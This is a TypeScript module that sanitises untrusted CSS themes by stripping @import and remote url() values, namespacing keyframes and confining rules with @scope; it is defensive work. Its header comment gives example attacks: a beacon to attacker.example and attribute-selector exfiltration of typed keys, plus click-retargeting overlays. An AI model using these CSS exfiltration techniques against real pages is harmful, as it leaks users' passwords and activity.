/**
 * Make a stranger's stylesheet safe to inject.
 *
 * ## Why CSS needs this at all
 *
 * "CSS is safe" comes from CSS having no script. But it has three things that compose into attacks:
 * **network access** (`url()`, `@import`), **conditional logic** (selectors match against page
 * state), and **complete control of what the user sees**. A theme is positioned as the
 * lowest-friction thing to install in WE, which makes it the highest-volume untrusted input in the
 * app. Concretely, before this:
 *
 * - **Beacons.** `background: url(https://attacker.example/ping)` fires a request when the rule
 *   applies. Per selector, that is: who installed the theme, their IP, when they are online, what
 *   they hover. For a local-first app whose pitch is that your data stays yours, a theme that phones
 *   home is a broken promise before anything worse happens.
 * - **Attribute-selector exfiltration.** `input[value^="sk-a"] { background: url(…/leak/sk-a) }`,
 *   a few hundred prefix rules, and you read typed input character by character — passwords, API
 *   keys — wherever a value reflects into the DOM. A demonstrated technique, not a theoretical one.
 * - **Click retargeting and relabelling.** A full-viewport `position: fixed` element at
 *   `opacity: 0.001`, or `::before { content: … }` rewriting a button's visible text. The user's
 *   belief about what they are clicking *is* the security boundary on every confirmation dialog.
 * - **`@import`** means the theme's behaviour can change *after* it was reviewed and installed, and
 *   the fetch is itself a beacon.
 *
 * ## What this does, and why in this order
 *
 * **The network is the exfiltration channel.** Close `url()` and the first two die together no
 * matter how clever the selectors get, which is why the filter is about values rather than about
 * spotting suspicious selectors — an approach that would be a losing arms race.
 *
 * 1. **Re-serialize through the browser's own parser.** Rules come back out of a real
 *    `CSSStyleSheet`, so anything smuggled past a regex by exotic encoding never survives the round
 *    trip. Nothing hand-written parses CSS here.
 * 2. **Drop `@import`.** No allowlist, not even for fonts: an allowlist is a maintenance surface and
 *    a font CDN still learns who applied the theme and when. A theme that needs a font should carry
 *    it (see the retro theme, which vendors VT323 for exactly this reason).
 * 3. **Drop any declaration whose value fetches.** `url(…)` unless it is `data:`, and the CSS
 *    functions that take a URL. Checked on the serialized value, so a custom property holding a URL
 *    and referenced elsewhere is caught by the same rule.
 * 4. **Namespace `@keyframes`.** They are global by name, so two themes — or a theme and the app —
 *    can otherwise silently redefine each other's animations.
 * 5. **Confine the sheet to a container** with `@scope`, so its rules cannot reach host chrome. This
 *    is also the mechanism scoped named themes need (audit P2-10), which is why it lives here rather
 *    than in the store.
 *
 * Rules divide cleanly into two kinds and each gets the treatment that fits it. Rules that *select
 * elements* are scoped. Rules that *define a name* — `@keyframes`, `@font-face` — select nothing, so
 * scoping would mean nothing to them; they are namespaced (or left alone) and hoisted above the
 * `@scope` block instead.
 *
 * ## What it deliberately does not do
 *
 * It does not stop a theme making a space's *own* content misleading — restyling a button inside
 * the space it themes is what theming is. Scoping keeps it out of the app's chrome, and the action
 * tier bounds what any button it restyles can actually do. The two halves are one system.
 */

export interface SanitiseCssOptions {
  /**
   * Selector the whole sheet is confined to — e.g. `[data-we-theme-scope]`. Omit for the document
   * theme, which is the agent's own choice about their own window and has no boundary to enforce.
   */
  scope?: string;
  /** Prefix for `@keyframes` names, so two themes cannot collide. Defaults to no renaming. */
  namespace?: string;
}

export interface SanitiseCssResult {
  css: string;
  /** What was removed, for showing the user why their theme looks different. */
  removed: string[];
}

/** Values that reach the network. `data:` is allowed — it is bytes, not a request. */
const FETCHING_VALUE = /(^|[^a-z-])(url\s*\(|image-set\s*\(|-webkit-image-set\s*\()/i;
const DATA_URI_ONLY = /url\s*\(\s*['"]?data:/i;

function fetchesRemotely(value: string): boolean {
  if (!FETCHING_VALUE.test(value)) return false;
  // A declaration may hold several `url()`s; every one of them has to be a data URI.
  const urls = value.match(/url\s*\([^)]*\)/gi) ?? [];
  if (!urls.length) return true;
  return urls.some((url) => !DATA_URI_ONLY.test(url));
}

/**
 * Split a selector list on its top-level commas only.
 *
 * `:is(.a, .b) .c` is one selector, not two. A plain `split(',')` cuts it into two fragments that
 * are each invalid, so the rule is silently lost — and silently losing rules is the failure mode
 * this whole file is trying not to have.
 */
function splitSelectorList(selector: string): string[] {
  const parts: string[] = [];
  let depth = 0;
  let quote: string | null = null;
  let start = 0;

  for (let i = 0; i < selector.length; i += 1) {
    const char = selector[i];
    if (quote) {
      if (char === quote && selector[i - 1] !== '\\') quote = null;
    } else if (char === '"' || char === "'") {
      quote = char;
    } else if (char === '(' || char === '[') {
      depth += 1;
    } else if (char === ')' || char === ']') {
      depth -= 1;
    } else if (char === ',' && depth === 0) {
      parts.push(selector.slice(start, i));
      start = i + 1;
    }
  }
  parts.push(selector.slice(start));
  return parts;
}

/** Matches the scoping root and everything under it. Zero specificity, so the cascade is unchanged. */
const SCOPE_INCLUSIVE = ':where(:scope, :scope *)';

/**
 * Anchor a selector to the scoping root, explicitly.
 *
 * `@scope` gives every selector inside it an implicit `:scope ` prefix — a **strict descendant**
 * combinator, so the scoping root itself is not matched. That is the wrong default here, and not by
 * a little: every one of WE's own themes is written as `[data-we-theme='retro'] we-button`, and the
 * element carrying that attribute *is* the wrapper the theme is scoped to. Left implicit, all five
 * built-in themes render as nothing at all in scoped mode.
 *
 * Two rewrites, and a selector that already names `:scope` keeps the implicit prefix off — which is
 * what makes both of them work:
 *
 * - `:root` / `html` / `body` become `:scope`. A theme declares its custom properties on the
 *   document root; scoped, "the document root" means "the subtree this theme owns". Untouched, they
 *   would match nothing (`html` is outside any scoping root) and the theme would lose every
 *   variable it sets.
 * - Everything else is prefixed with `:where(:scope, :scope *)` — the inclusive form of what
 *   `@scope` implies.
 *
 * `@scope` still does the enforcing. This only fixes what the rules *reach*; a selector that escaped
 * this rewrite would still be confined by the block around it.
 */
function scopeSelector(selector: string): string {
  return splitSelectorList(selector)
    .map((part) => {
      const trimmed = part.trim();
      if (!trimmed) return trimmed;
      // A leading run, so `html body .card` collapses rather than leaving a `body` that is outside
      // the scope and would match nothing.
      const rooted = trimmed.replace(/^((?::root|html|body)\b\s*)+/i, ':scope ').trimEnd();
      return rooted === trimmed ? `${SCOPE_INCLUSIVE}${trimmed}` : rooted;
    })
    .join(', ');
}

/**
 * What a walk of the sheet produces: rules that select elements, and rules that define a name.
 *
 * They are kept apart because only the first kind can be scoped. `@keyframes` and `@font-face`
 * select nothing — putting them inside `@scope` would at best mean nothing and at worst have the
 * browser reject them, so they are hoisted above it and given a namespace instead.
 */
interface Collected {
  scoped: string[];
  hoisted: string[];
}

function sanitiseStyleRule(rule: CSSStyleRule, options: SanitiseCssOptions, removed: string[]): string | null {
  const declarations: string[] = [];
  const style = rule.style;

  for (let i = 0; i < style.length; i += 1) {
    const property = style.item(i);
    const value = style.getPropertyValue(property);
    if (fetchesRemotely(value)) {
      removed.push(`${property} (fetches over the network)`);
      continue;
    }
    const priority = style.getPropertyPriority(property);
    declarations.push(`${property}: ${value}${priority ? ' !important' : ''}`);
  }

  /*
    Nested rules are dropped, and said so.

    A style rule can hold child rules (`&:hover { … }`, or a bare nested selector). Scoping one
    correctly means rewriting a *relative* selector against a parent that has itself been rewritten,
    which is a different problem from `scopeSelector`'s and not one to solve by accident. So they are
    refused — but they used to be refused *silently*, which is the part that mattered: a theme author
    whose nesting vanished got a sheet that applied half of what they wrote and a `removed` list that
    said nothing had been removed.
  */
  const nested = (rule as CSSStyleRule & { cssRules?: CSSRuleList }).cssRules;
  if (nested?.length) removed.push('nested rules inside a selector (write them out in full instead)');

  if (!declarations.length) return null;
  const selector = options.scope ? scopeSelector(rule.selectorText) : rule.selectorText;
  return `${selector} { ${declarations.join('; ')} }`;
}

/** The at-rule keyword for a grouping rule, from its interface name: `CSSMediaRule` → `@media`. */
function groupKeyword(type: string): string {
  return `@${type.replace(/^CSS/, '').replace(/Rule$/, '').toLowerCase()}`;
}

function sanitiseRule(rule: CSSRule, options: SanitiseCssOptions, out: Collected, removed: string[]): void {
  // `CSSRule.IMPORT_RULE` and friends are not defined in every environment the tests run in, so the
  // discrimination is by constructor name, which jsdom and browsers agree on.
  const type = rule.constructor.name;

  if (type === 'CSSImportRule') {
    removed.push('@import (loads a stylesheet from elsewhere, after you installed this one)');
    return;
  }

  if (type === 'CSSStyleRule') {
    const text = sanitiseStyleRule(rule as CSSStyleRule, options, removed);
    if (text) out.scoped.push(text);
    return;
  }

  if (type === 'CSSKeyframesRule') {
    const keyframes = rule as CSSKeyframesRule;
    const name = options.namespace ? `${options.namespace}-${keyframes.name}` : keyframes.name;
    // The frames themselves are never scoped: a frame's `selectorText` is an offset (`from`, `50%`),
    // not a selector, so rewriting it would produce a keyframe that applies at no point in time.
    const frames: string[] = [];
    for (const frame of [...keyframes.cssRules]) {
      const text = sanitiseStyleRule(frame as unknown as CSSStyleRule, { namespace: options.namespace }, removed);
      if (text) frames.push(text);
    }
    if (frames.length) out.hoisted.push(`@keyframes ${name} { ${frames.join(' ')} }`);
    return;
  }

  // Grouping rules — media, supports, container. Their conditions are inert; their contents are not,
  // so recurse. Anything a child hoists keeps travelling up: `@keyframes` inside `@media` is a
  // conditional definition of a name, and it stays one.
  if (type === 'CSSMediaRule' || type === 'CSSSupportsRule' || type === 'CSSContainerRule') {
    const group = rule as CSSMediaRule;
    const inner: Collected = { scoped: [], hoisted: [] };
    for (const child of [...group.cssRules]) sanitiseRule(child, options, inner, removed);
    if (inner.hoisted.length) {
      out.hoisted.push(`${groupKeyword(type)} ${group.conditionText} { ${inner.hoisted.join(' ')} }`);
    }
    if (inner.scoped.length) {
      out.scoped.push(`${groupKeyword(type)} ${group.conditionText} { ${inner.scoped.join(' ')} }`);
    }
    return;
  }

  /*
    `@layer name { … }` — a grouping rule too, and one worth keeping.

    A theme's whole job is overriding the app's own styles, so the layer a rule sits in is part of
    what it means. It used to fall through to "unrecognised" and take the entire block with it, so a
    theme organised into layers lost everything inside them at once. The name travels through
    unchanged: a layer is a name, not a selector, and it is already namespaced by `@scope` around
    the whole sheet.

    The statement form (`@layer a, b;`, `CSSLayerStatementRule`) declares an order and holds no
    rules; it is kept for the same reason and emitted as written.
  */
  if (type === 'CSSLayerBlockRule') {
    const layer = rule as CSSGroupingRule & { name?: string };
    const inner: Collected = { scoped: [], hoisted: [] };
    for (const child of [...layer.cssRules]) sanitiseRule(child, options, inner, removed);
    const name = layer.name ? ` ${layer.name}` : '';
    if (inner.hoisted.length) out.hoisted.push(`@layer${name} { ${inner.hoisted.join(' ')} }`);
    if (inner.scoped.length) out.scoped.push(`@layer${name} { ${inner.scoped.join(' ')} }`);
    return;
  }

  if (type === 'CSSLayerStatementRule') {
    const names = (rule as CSSRule & { nameList?: readonly string[] }).nameList;
    if (names?.length) out.hoisted.push(`@layer ${[...names].join(', ')};`);
    return;
  }

  /*
    `@property` — a registered custom property. It defines a name and selects nothing, so it hoists
    beside `@keyframes`, and for the same reason it was dropped before: it is neither a style rule
    nor a grouping rule and nothing had a branch for it.

    Its `initial-value` is a value like any other, so it goes through the same network check. The
    rest of the descriptor — a syntax string and an inherits flag — cannot fetch.
  */
  if (type === 'CSSPropertyRule') {
    const property = rule as CSSRule & {
      name?: string;
      syntax?: string;
      inherits?: boolean;
      initialValue?: string | null;
    };
    if (!property.name) {
      removed.push('@property (its name could not be read)');
      return;
    }
    const initial = property.initialValue ?? '';
    if (fetchesRemotely(initial)) {
      removed.push(`@property ${property.name} (its initial value fetches over the network)`);
      return;
    }
    const parts = [`syntax: ${property.syntax ?? '"*"'}`, `inherits: ${property.inherits ? 'true' : 'false'}`];
    if (initial) parts.push(`initial-value: ${initial}`);
    out.hoisted.push(`@property ${property.name} { ${parts.join('; ')} }`);
    return;
  }

  if (type === 'CSSFontFaceRule') {
    // A font face is a `src: url(...)` by definition, so it survives only as a data URI — which is
    // exactly how a theme that carries its own font ships one.
    const style = (rule as CSSFontFaceRule).style;
    const src = style.getPropertyValue('src');
    if (!src) {
      // The parser did not give the `src` back, so there is no font here to keep and no URL to
      // judge. Emitting the rest would produce a `@font-face` that declares a family and loads
      // nothing — silently shadowing the family it names. (jsdom's CSS parser does exactly this: it
      // does not recognise `src` and drops the declaration entirely.)
      removed.push('@font-face (its font source could not be read)');
      return;
    }
    if (fetchesRemotely(src)) {
      removed.push('@font-face (loads a font from another server)');
      return;
    }
    // Rebuilt from the declarations rather than returned as `cssText`: at-rule serialization is not
    // uniform across parsers, and the point of this pass is that what comes out is what this code
    // decided to emit.
    const declarations: string[] = [];
    for (let i = 0; i < style.length; i += 1) {
      const property = style.item(i);
      declarations.push(`${property}: ${style.getPropertyValue(property)}`);
    }
    if (declarations.length) out.hoisted.push(`@font-face { ${declarations.join('; ')} }`);
    return;
  }

  // Anything unrecognised is dropped rather than passed through. New at-rules arrive regularly and
  // "allow what I have thought about" is the only version of this that stays correct.
  removed.push(`${type} (not allowed in an installed theme)`);
}

/**
 * The parsed rules of `css`, without the document ever being asked to *apply* it.
 *
 * ## Why this is not a `<style>` in `document.head`
 *
 * It was, and that undid the filter's headline promise. Appending the raw sheet to the live head to
 * read `element.sheet` makes it a live stylesheet for as long as it is attached — and the browser
 * acts on a live stylesheet immediately. The `@import` this whole module exists to strip was
 * **fetched, once per call**, before anything was removed: on every keystroke in the theme editor,
 * and on every peer-theme sync. The `finally { element.remove() }` tidied up after the request had
 * already gone out.
 *
 * A constructed `CSSStyleSheet` is the primitive that actually fits. It is a parser with no
 * document behind it, so nothing it holds is applied and nothing it names is fetched — and
 * `replaceSync` is specified to *discard* `@import` rules rather than resolve them, which is the
 * same answer this module reaches by hand, arrived at before any network call is possible.
 *
 * The fallbacks below exist for hosts without it. Neither is reached in any browser this ships to.
 */
function parseRules(css: string): CSSRuleList | null {
  if (typeof CSSStyleSheet !== 'undefined' && typeof CSSStyleSheet.prototype?.replaceSync === 'function') {
    try {
      const sheet = new CSSStyleSheet();
      sheet.replaceSync(css);
      return sheet.cssRules;
    } catch {
      // Fall through — an environment that has the constructor but refuses to use it.
    }
  }

  if (typeof document === 'undefined') return null;

  /*
    A document with no browsing context, from `createHTMLDocument`. Style elements in one are still
    parsed by engines that populate `.sheet` there, and — the point — a document that is not being
    displayed fetches nothing. jsdom does not populate `.sheet` in such a document, which is why the
    live-document path below still exists at all.
  */
  const inert = document.implementation?.createHTMLDocument?.('');
  if (inert) {
    const element = inert.createElement('style');
    element.textContent = css;
    inert.head.appendChild(element);
    if (element.sheet) return element.sheet.cssRules;
  }

  const element = document.createElement('style');
  element.textContent = css;
  document.head.appendChild(element);
  try {
    return element.sheet?.cssRules ?? null;
  } finally {
    element.remove();
  }
}

/**
 * Parse, filter and re-serialize a stylesheet.
 */
export function sanitiseCss(css: string, options: SanitiseCssOptions = {}): SanitiseCssResult {
  const removed: string[] = [];
  if (!css.trim()) return { css: '', removed };

  /*
    Reported from the source text, because the parser may already have thrown the rule away.

    `replaceSync` drops `@import` before this code sees a rule list, so the branch in `sanitiseRule`
    that names it never fires there. Saying nothing would leave a theme author watching their import
    vanish with no explanation — the exact silence the `removed` list exists to break. Matching the
    text is only ever used to *say* something; what is actually dropped is decided by the parser.
  */
  if (/@import\b/i.test(css)) {
    removed.push('@import (loads a stylesheet from elsewhere, after you installed this one)');
  }

  const rules = parseRules(css);
  if (!rules) {
    // No parser available: refuse rather than pass it through. A server-rendered host has no
    // business injecting a stranger's CSS anyway.
    return { css: '', removed: ['the whole stylesheet (it could not be parsed here)'] };
  }

  const out: Collected = { scoped: [], hoisted: [] };
  for (const rule of [...rules]) sanitiseRule(rule, options, out, removed);

  const body =
    options.scope && out.scoped.length
      ? `@scope (${options.scope}) {\n${out.scoped.join('\n')}\n}`
      : out.scoped.join('\n');

  return { css: [...out.hoisted, body].filter(Boolean).join('\n'), removed: [...new Set(removed)] };
}
